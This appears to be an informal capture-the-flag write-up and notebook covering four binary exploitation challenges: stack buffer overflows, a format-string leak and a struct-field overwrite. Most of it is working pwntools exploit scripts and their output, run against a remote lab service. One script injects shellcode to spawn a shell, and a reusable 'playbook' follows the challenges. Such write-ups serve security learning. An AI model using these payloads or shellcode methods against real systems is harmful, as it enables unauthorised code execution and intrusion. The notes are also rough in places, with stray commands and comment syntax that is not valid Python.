# Pwn Challenge Writeups

Four binary exploitation challenges, each building on a different memory-safety bug class. This writeup walks through the reasoning behind each step, not just the final payload.


source /home/milizes/pwntools-env/venv/bin/activate


source /home/milizes/pwn-env/bin/activate 
DESKTOP^^^

---

## 1. whats a buffer overflow — Classic Stack Buffer Overflow (ret2win)

**Service:** `nc 3.144.177.121 5002`

### The setup

The server printed everything we needed up front: the buffer's address, the saved return address's location, `win()`'s address, and the offset between the buffer and the saved RIP (40 bytes).

### Reasoning

A normal function call pushes a return address onto the stack so the CPU knows where to resume execution afterward. The stack layout for the vulnerable function was:

```
[ buffer (32 bytes) ]
[ saved RBP (8 bytes) ]
[ saved RIP (8 bytes) ]   <- target
```

Since `read()`/input handling wrote into `buffer` with no bounds check, writing past the 32-byte buffer let us walk straight through the saved RBP and into the saved return address. The given offset (40 bytes = 32 buffer + 8 saved RBP) told us exactly how much junk to send before our real payload began.

### The payload

```
payload = b'A' * 40 + p64(0x401186)   # win()'s address, little-endian


exact commad:
python3 -c 'import sys,struct;sys.stdout.buffer.write(b"A"*40+struct.pack("<I",0x401186))' | nc 3.144.177.121 5002
^^ use <Q for 8 bytes etc. 0x0000000000401186

SIT{764c6759dc7d87cf27f5cd043e167e77}

this writes 40 As as buffer then rewrites the return address to 0x401186 in little endian which returns us the flag
```

```
what nc 3.144.177.121 5002 shows

=== STACK LAB: Watch a buffer overflow happen ===
buffer:        0x7fff089c7310
saved RIP:     0x7fff089c7338
win():         0x401186
offset to RIP: 40 bytes

Mission: replace the saved RIP with win() and claim the flag.
Send up to 256 bytes (binary input accepted):

it gives us the win address so we can use it with pwn tools

```
**using pwntools**
``` python
from pwn import *

io = remote('3.144.177.121', 5002)

payload = cyclic(100) # aaaabaaacaaadaaa...

io.recvline()

io.recvline()

io.recvline()

io.sendline(payload)

io.interactive()

returned 0x6161616c6161616b, indicates 64 bits
```

``` python
from pwn import *

offset = cyclic_find(0x6161616c6161616b)

io = remote('3.144.177.121', 5002)

payload = b'A' * offset

payload += p64(0x0401186) // set to p64 instead of p32 in rookie.py

io.recvline()

io.recvline()

io.recvline()

io.sendline(payload)

io.interactive()

returns SIT{764c6759dc7d87cf27f5cd043e167e77}
```
**Why little-endian mattered:** x86-64 stores multi-byte values least-significant-byte-first. `win()` at `0x0000000000401186` had to be written as `86 11 40 00 00 00 00 00`, not in "reading order," or the CPU would jump to a garbage address and crash instead of calling `win()`.

### Outcome

Sending this payload caused `vulnerable()`'s `ret` to jump into `win()` instead of back to `main()`, printing the flag. This is the textbook "stack smashing" primitive that every later challenge built on in some form.

---

## 2. Echo Chamber — Format String Vulnerability

**Service:** `nc 3.144.177.121 5004`

### The vulnerability

The flavor text ("reveals more than you originally sent") pointed at a format string bug: code that does `printf(user_input)` instead of `printf("%s", user_input)`. When user input is passed directly as the *format* argument, any `%` sequences in it are interpreted by `printf` as instructions to pull extra arguments off the stack, arguments that were never actually supplied.

### Step 1: Confirm the bug

```
Name: %x %x %x %x %x %x %x %x
```

This came back with a string of hex values instead of literal `%x` text, confirming `printf` was reading stack memory it had no business reading.

### Step 2: Fix the "missing bytes" problem

Using `%x` (4-byte width) initially produced a string that *looked* right (`SIT{@t_5gs}`, starting with `SIT{` and ending with `}`) but was rejected. The reasoning for why:

On x86-64, each variadic argument slot is 8 bytes wide, regardless of the width `printf` is told to print. `%x` prints only the low 4 bytes of a slot but `va_arg` still advances by the full 8 bytes, silently skipping the upper 4 bytes of every argument. Any flag data living in those "skipped" bytes never gets printed.

**Fix:** use `%lx` (8-byte width) instead, so each read matches the real slot size with no gaps.

```
Name: %6$lx %7$lx %8$lx %9$lx %10$lx
```

(Positional specifiers like `%6$lx` let us jump directly to a specific argument slot instead of printing everything before it.)

### Step 3: Decode

Each 8-byte hex chunk was split into byte pairs, reversed (little-endian), and converted to ASCII:

```
6d7230667b544953 -> SIT{f0rm
6e697274355f7440 -> @t_5trin
7d7367           -> gs}
```

Concatenated: `SIT{f0rm@t_5trings}` — "format strings" in leetspeak, a fitting flag for the bug class.

with pwntools
```python
from pwn import *

for i in range(1, 10):

 print('********************************')

 print(i)

 print('********************************')

 io = remote('3.144.177.121', 5004)

 io.sendline(f"%{i}$s".encode())

 print(io.recvrepeat(0.5))

 io.close()
 
 this shows us position 1 and 2 returns the flag
 
 (pwn-env) milizes@DESKTOP-K5BKQBC:~/pwn-env$ python3 echochamber.py
1
********************************
[+] Opening connection to 3.144.177.121 on port 5004: Done
b"=== Welcome to Echo Chamber ===\nTell me your name, and I'll repeat it!\nName: Hello, SIT{f0rm@t_5trings}!\n"
[*] Closed connection to 3.144.177.121 port 5004
********************************
2
********************************
[+] Opening connection to 3.144.177.121 on port 5004: Done
b"=== Welcome to Echo Chamber ===\nTell me your name, and I'll repeat it!\nName: Hello, SIT{f0rm@t_5trings}!\n"
[*] Closed connection to 3.144.177.121 port 5004
******************************** 
```

```python
from pwn import *

io = remote('3.144.177.121', 5004)

io.sendline(b'%2$s')

print(io.recvall(timeout=1))

// use this to further clarify the flag with position %2$s or %1$s, depedning on position in above code.
```
### Key lesson

Choosing the wrong width specifier doesn't error out, it silently corrupts the read. That makes format string leaks dangerous in a way distinct from a crash-based bug: a *wrong* answer can still look plausible.

---

## 3. Rookie Access Terminal — buffer overflow

**Service:** `nc 3.144.177.121 5001` (source: `chall.c`)

### Reading the source

```c
struct player {
    char name[32];
    unsigned int access_code;
};
...
ssize_t n = read(STDIN_FILENO, p.name, 64);
...
if (p.access_code == 0x1337c0de) { ... win() ... }
```

Two facts combined into the bug:

1. `name` is declared as 32 bytes, but `read()` was told it could accept up to **64**.
2. `access_code` sits immediately after `name` in memory (no padding needed — 32 is already 4-byte aligned).

### Reasoning

We didn't need to guess or leak `0x1337c0de`. Because the overflow writes contiguously, we could **directly overwrite** `access_code` with the value the check expects, just by writing past the end of `name`.

### The payload

```python
payload = b'A' * 32 + p32(0x1337c0de)   # 36 bytes total, well under the 64-byte limit
```

```
what nc 3.144.177.121 5001 shows us

(pwn-env) milizes@DESKTOP-K5BKQBC:~/pwn-env$ nc 3.144.177.121 5001
=== Rookie Access Terminal ===
Enter your name:

in the chall.c given to us, we can see the access_code is 0x1337c0de which is also the win address.

(pwn-env) milizes@DESKTOP-K5BKQBC:~/pwn-env$ python3 rookie.py
[+] Opening connection to 3.144.177.121 on port 5001: Done
[*] Switching to interactive mode
Hello, aaaabaaacaaadaaaeaaafaaagaaahaaa!
Access denied. Code: 0x61616169

it also returns the address we need for the return address.

```
**using pwntools**
find return address
```python
from pwn import *

io = remote('3.144.177.121', 5001)

payload = cyclic(100) # aaaabaaacaaadaaa...

io.recvline()

io.recvline()

io.sendline(payload)

io.interactive()

this returns 0x61616169
```

```python
from pwn import *

offset = cyclic_find(0x61616169) # -> 44

io = remote('3.144.177.121', 5001)

payload = b'A' * offset

payload += p32(0x1337c0de)

io.recvline()

io.recvline()

io.sendline(payload)

io.interactive()

this returns SIT{Acc355_Gr@nted}
```

The `printf("Hello, %.32s!\n", p.name)` call used a precision specifier (`.32`) that capped output at exactly `name`'s size, so our overwrite of `access_code` was invisible in the echoed output but still took effect in memory.

### Outcome

The access check passed, `win()` ran, and the flag printed.

### Key lesson

Not every exploitable bug involves hijacking control flow (return addresses, function pointers). Sometimes the "vulnerable" thing is just adjacent struct fields with no boundary enforcement between them, a mismatch between a buffer's declared size and the size passed to the function that fills it.

---

## 4. Echo32 — Buffer Overflow to Shellcode
**Service:** `nc 3.144.177.121 5003` (binary: `echo32`)
### Initial recon

```bash
file echo32        -> ELF 32-bit LSB executable, dynamically linked, not stripped
checksec            -> No canary, No PIE, Executable stack (RWX), Partial RELRO

chmod +x echo32
file ./echo32
checksec --file=./echo32
strings -n 6 ./echo32
nm -n ./echo32 | grep ' jump_to_stack$'

(pwn-env) milizes@DESKTOP-K5BKQBC:~/pwn-env/schctf/buf$ file ./echo32
./echo32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=852eef96ebaae9687f0421f143e0f2dba7905cc8, for GNU/Linux 3.2.0, not stripped

## confirms 32 bit, use to confirm if 32bit vs 64bit to use p32 or p64 in pwntools

(pwn-env) milizes@DESKTOP-K5BKQBC:~/pwn-env/schctf/buf$ checksec --file=./echo32
[*] '/home/milizes/pwn-env/schctf/buf/echo32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    
## what security is enabled
## canary(stack protect): if present, then we have to overwrite the canary first
## NX(no execute): if enabled, cannot execute code on stack
## PIE: if enabled, this is ASLR
## RELRO: relevant if attack GOT(global offset table)
    
(pwn-env) milizes@DESKTOP-K5BKQBC:~/pwn-env/schctf/buf$ strings -n 6 ./echo32
/lib/ld-linux.so.2
_IO_stdin_used
setvbuf
fflush
stdout
__libc_start_main
libc.so.6
GLIBC_2.0
GLIBC_2.34
__gmon_start__
Welcome to Echo32. Enter a message:
Message received.
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0
crt1.o
__abi_tag
__wrap_main
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
challenge.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
read@GLIBC_2.0
__x86.get_pc_thunk.bx
fflush@GLIBC_2.0
_edata
__data_start
puts@GLIBC_2.0
__gmon_start__
__dso_handle
_IO_stdin_used
jump_to_stack ################################################ jump_to_stack here
setvbuf@GLIBC_2.0
_dl_relocate_static_pie
_fp_hw
stdout@GLIBC_2.0
__bss_start
vulnerable
__TMC_END__
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.comment

## give printable ASCII string of chars.
## scans for unusual lines, jump_to_stack and vulnerable look like custom functions
## adapt -n to get more meaningful results, lower like 3 gives noisier results

(pwn-env) milizes@DESKTOP-K5BKQBC:~/pwn-env/schctf/buf$ nm -n ./echo32 | grep ' jump_to_stack$'
08049196 T jump_to_stack

## find the address for the custom function found in strings

confirms 32-bit, no canary, no PIE, executable stack and gives gadget symbol

gives us 0x08049196, the address for the start of the function in the symbol table
we cant trust this address blindly, so we do the address sweep.
```

**finding offset**
```python
from pwn import *

io = process('./echo32')

io.sendline(cyclic(300))

io.wait()

core = io.corefile

print(cyclic_find(core.eip, n=4))

(pwn-env) milizes@DESKTOP-K5BKQBC:~/pwn-env/schctf/buf$ python echo32.py
[+] Starting local process './echo32': pid 3122
[*] Process './echo32' stopped with exit code -11 (SIGSEGV) (pid 3122)
[+] Parsing corefile...: Done
[*] '/home/milizes/pwn-env/schctf/buf/core.3122'
    Arch:      i386-32-little
    EIP:       0x62616169
    ESP:       0xff8a2258
    Exe:       '/home/milizes/pwn-env/schctf/buf/echo32' (0x8048000)
    Fault:     0x62616169
132

// shows offset of 132
```

**sweep for address shift**
tries every address from base 0x08049196 -32 to +32
this script is just testing different return address to confirm the jump sto stack returned by nm in earlier recon.
```python
from pwn import *

context.clear(arch='i386', os='linux')

base = 0x08049196

for delta in range(-32, 33, 4):

    gadget = base + delta

    shellcode = asm(shellcraft.sh())

    payload = b'A' * 132 + p32(gadget) + b'\x90'*20 + shellcode

    try:

        io = remote('3.144.177.121', 5003, timeout=3)

        io.sendline(payload)

        io.sendline(b'id')

        resp = io.recvall(timeout=2)

        if b'uid=' in resp:

            print(f"HIT at delta {delta}: {hex(gadget)}")

            print(resp)

        io.close()

    except Exception as e:

        pass
        
(pwn-env) milizes@DESKTOP-K5BKQBC:~/pwn-env/schctf/buf$ python echo32.py
[+] Opening connection to 3.144.177.121 on port 5003: Done
[+] Receiving all data: Done (54B)
[*] Closed connection to 3.144.177.121 port 5003
[+] Opening connection to 3.144.177.121 on port 5003: Done
[+] Receiving all data: Done (54B)
[*] Closed connection to 3.144.177.121 port 5003
[+] Opening connection to 3.144.177.121 on port 5003: Done
[+] Receiving all data: Done (54B)
[*] Closed connection to 3.144.177.121 port 5003
[+] Opening connection to 3.144.177.121 on port 5003: Done
[+] Receiving all data: Done (54B)
[*] Closed connection to 3.144.177.121 port 5003
[+] Opening connection to 3.144.177.121 on port 5003: Done
[+] Receiving all data: Done (96B)
[*] Closed connection to 3.144.177.121 port 5003
HIT at delta -16: 0x8049186
b'Welcome to Echo32. Enter a message:\nMessage received.\nuid=999(ctf) gid=999(ctf) groups=999(ctf)\n'
```

**connect with 0x8049186**
```python
from pwn import *

context.clear(arch='i386', os='linux')

GADGET = 0x08049186 // originally this was 0x08049196, we confirm the hit at earlier script.

OFFSET = 132

shellcode = asm(shellcraft.sh())

payload = b'A' * OFFSET + p32(GADGET) + b'\x90' * 20 + shellcode

assert len(payload) <= 512

io = remote('3.144.177.121', 5003)

io.sendline(payload)

io.interactive()
```
### Finding the flag

```
find / -iname "*flag*" 2>/dev/null
cat /home/ctf/flag.txt
```

Flag: `SIT{G0t_@_R3V_SHELL}`

for echo32, this is a buffer overflow to shell.
what other types of buffer overflow or format string flag scenarios can there be?


**general playbook for echo32 in test ctf**

**recon**
```shell
chmod +x echo32
file ./echo32 ## confirm 32 vs 64 bit
checksec --file=./echo32 ## confirm canary, NX, ASLR(PIE) disabled
nm -n ./echo32 ## shows us the address for the functions.
nm -n ./echo32 | grep ' jump_to_stack$' ## grep the interesting function cleanly
```

**find offset**
```python
from pwn import *
io = process('./echo32') // run the process locally first
io.sendline(cyclic(300))
io.wait()
core = io.corefile
print(cyclic_find(core.eip, n=4)) // swap to core.rip and n = 8 for 64-bit

############## corefile is used for local testing, remote testing is possible
from pwn import *
io = remote('3.144.177.121', 5002)
payload = cyclic(100)
io.recvline()
io.recvline()
io.sendline(payload)
io.interactive()
```